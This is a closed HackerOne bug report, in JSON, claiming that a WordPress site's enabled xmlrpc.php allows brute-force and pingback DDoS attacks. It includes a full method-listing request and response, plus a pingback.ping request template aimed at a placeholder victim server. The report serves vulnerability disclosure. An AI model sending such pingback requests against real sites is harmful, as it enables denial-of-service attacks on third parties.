{
  "id": 769716,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83Njk3MTY=",
  "url": "https://hackerone.com/reports/769716",
  "title": "xmlrpc.php FILE IS enable it can be used for conducting a Bruteforce attack and Denial of Service(DoS)",
  "state": "Closed",
  "substate": "not-applicable",
  "severity_rating": "none",
  "readable_substate": "N/A",
  "created_at": "2020-01-07T20:03:25.653Z",
  "submitted_at": "2020-01-07T20:03:25.653Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": true,
    "username": "shrimant_yogi",
    "url": "/shrimant_yogi",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 162,
    "url": "https://hackerone.com/iandunn-projects",
    "handle": "iandunn-projects",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/162/2b148a5580e8f7c45d676df7576fb8b11b4de9ad_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/162/2b148a5580e8f7c45d676df7576fb8b11b4de9ad_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Ian Dunn",
      "twitter_handle": "",
      "website": "",
      "about": "I'm a WordPress developer who maintains several small open source projects."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-01-07T20:13:35.908Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2020-01-07T20:12:49.928Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi Team,\n\nThe website https://www.iandunn.name has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts. Wordpress that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS.\n\nURL: https://www.iandunn.name\n\nIn order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp, send the request below.\n\nRequest:\nPOST /xmlrpc.php HTTP/1.1\nHost: www.iandunn.name\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Length: 135\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<methodCall>\n<methodName>system.listMethods</methodName>\n<params></params>\n</methodCall>\n\n-------------------------------------------------------------------------------------------------------------------------------------\n\nResponse:\n\nHTTP/1.1 200 OK\nDate: Tue, 07 Jan 2020 19:32:48 GMT\nContent-Type: text/xml; charset=UTF-8\nConnection: close\nSet-Cookie: __cfduid=dc58db4ecd3ff4946ffca93e21566ff371578425567; expires=Thu, 06-Feb-20 19:32:47 GMT; path=/; domain=.iandunn.name; HttpOnly; SameSite=Lax\nX-Frame-Options: SAMEORIGIN\nStrict-Transport-Security: max-age=15552000\nCF-Cache-Status: DYNAMIC\nX-Content-Type-Options: nosniff\nExpect-CT: max-age=604800, report-uri=\"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\"\nServer: cloudflare\nCF-RAY: 55185c145806dcd6-SIN\nContent-Length: 4272\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n  <params>\n    <param>\n      <value>\n      <array><data>\n  <value><string>system.multicall</string></value>\n  <value><string>system.listMethods</string></value>\n  <value><string>system.getCapabilities</string></value>\n  <value><string>demo.addTwoNumbers</string></value>\n  <value><string>demo.sayHello</string></value>\n  <value><string>pingback.extensions.getPingbacks</string></value>\n  <value><string>pingback.ping</string></value>\n  <value><string>mt.publishPost</string></value>\n  <value><string>mt.getTrackbackPings</string></value>\n  <value><string>mt.supportedTextFilters</string></value>\n  <value><string>mt.supportedMethods</string></value>\n  <value><string>mt.setPostCategories</string></value>\n  <value><string>mt.getPostCategories</string></value>\n  <value><string>mt.getRecentPostTitles</string></value>\n  <value><string>mt.getCategoryList</string></value>\n  <value><string>metaWeblog.getUsersBlogs</string></value>\n  <value><string>metaWeblog.deletePost</string></value>\n  <value><string>metaWeblog.newMediaObject</string></value>\n  <value><string>metaWeblog.getCategories</string></value>\n  <value><string>metaWeblog.getRecentPosts</string></value>\n  <value><string>metaWeblog.getPost</string></value>\n  <value><string>metaWeblog.editPost</string></value>\n  <value><string>metaWeblog.newPost</string></value>\n  <value><string>blogger.deletePost</string></value>\n  <value><string>blogger.editPost</string></value>\n  <value><string>blogger.newPost</string></value>\n  <value><string>blogger.getRecentPosts</string></value>\n  <value><string>blogger.getPost</string></value>\n  <value><string>blogger.getUserInfo</string></value>\n  <value><string>blogger.getUsersBlogs</string></value>\n  <value><string>wp.restoreRevision</string></value>\n  <value><string>wp.getRevisions</string></value>\n  <value><string>wp.getPostTypes</string></value>\n  <value><string>wp.getPostType</string></value>\n  <value><string>wp.getPostFormats</string></value>\n  <value><string>wp.getMediaLibrary</string></value>\n  <value><string>wp.getMediaItem</string></value>\n  <value><string>wp.getCommentStatusList</string></value>\n  <value><string>wp.newComment</string></value>\n  <value><string>wp.editComment</string></value>\n  <value><string>wp.deleteComment</string></value>\n  <value><string>wp.getComments</string></value>\n  <value><string>wp.getComment</string></value>\n  <value><string>wp.setOptions</string></value>\n  <value><string>wp.getOptions</string></value>\n  <value><string>wp.getPageTemplates</string></value>\n  <value><string>wp.getPageStatusList</string></value>\n  <value><string>wp.getPostStatusList</string></value>\n  <value><string>wp.getCommentCount</string></value>\n  <value><string>wp.deleteFile</string></value>\n  <value><string>wp.uploadFile</string></value>\n  <value><string>wp.suggestCategories</string></value>\n  <value><string>wp.deleteCategory</string></value>\n  <value><string>wp.newCategory</string></value>\n  <value><string>wp.getTags</string></value>\n  <value><string>wp.getCategories</string></value>\n  <value><string>wp.getAuthors</string></value>\n  <value><string>wp.getPageList</string></value>\n  <value><string>wp.editPage</string></value>\n  <value><string>wp.deletePage</string></value>\n  <value><string>wp.newPage</string></value>\n  <value><string>wp.getPages</string></value>\n  <value><string>wp.getPage</string></value>\n  <value><string>wp.editProfile</string></value>\n  <value><string>wp.getProfile</string></value>\n  <value><string>wp.getUsers</string></value>\n  <value><string>wp.getUser</string></value>\n  <value><string>wp.getTaxonomies</string></value>\n  <value><string>wp.getTaxonomy</string></value>\n  <value><string>wp.getTerms</string></value>\n  <value><string>wp.getTerm</string></value>\n  <value><string>wp.deleteTerm</string></value>\n  <value><string>wp.editTerm</string></value>\n  <value><string>wp.newTerm</string></value>\n  <value><string>wp.getPosts</string></value>\n  <value><string>wp.getPost</string></value>\n  <value><string>wp.deletePost</string></value>\n  <value><string>wp.editPost</string></value>\n  <value><string>wp.newPost</string></value>\n  <value><string>wp.getUsersBlogs</string></value>\n</data></array>\n      </value>\n    </param>\n  </params>\n</methodResponse>\n\nNotice that a successful response is received showing that the xmlrpc.php file is enabled. Now, considering the domain https://www.iandunn.name, the xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below.\n\nPOST /xmlrpc.php HTTP/1.1\nHost: https://www.iandunn.name\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Length: 135\n<methodCall>\n<methodName>pingback.ping</methodName>\n<params>\n<param>\n<value><string>http://<YOUR SERVER ></string></value>\n</param>\n<param>\n<value><string>https://www.iandunn.name</string></value>\n</param>\n</params>\n\nRemediation:\nIf the XMLRPC.php file is not being used, it should be disabled and removed completely to avoid any potential risks. Otherwise, it should at the very least be blocked from external access.\n\nPOC: Screenshots are attached\n\nReference :\n1) Here is the explanation of xmlrpc file enable brute force attack- https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html\n2) The explanation for xmlrpc.php file will enable dos attack- https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html\n\nReference Hackerone Reports: #325040 #448524 #448524\n\nThanks, waiting for your response.\n\n## Impact\n\n1)This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.\n\n2) This method is also used for brute force attacks to stealing the admin credentials and other important credentials",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 1,
  "voters": [
    "bkeltosh"
  ],
  "severity": {
    "rating": "none",
    "score": 0.0,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "none",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 2394,
    "asset_type": "URL",
    "asset_identifier": "iandunn.name",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
